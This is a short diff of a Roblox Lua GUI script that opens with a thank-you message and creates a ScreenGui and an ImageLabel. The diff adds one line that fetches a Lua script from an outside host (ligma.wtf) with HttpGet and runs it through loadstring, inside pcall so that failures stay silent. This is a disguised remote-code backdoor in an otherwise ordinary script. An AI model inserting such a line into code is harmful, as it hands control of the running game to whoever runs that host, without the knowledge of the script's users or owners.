@@ -1,6 +1,6 @@
 print("ty so much colastee for basically doing all the work for project 2016 -spec")
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 wait(0.6)
-
 local Gui = Instance.new("ScreenGui")
 wait(0.05)
 local ImageLabel = Instance.new("ImageLabel")
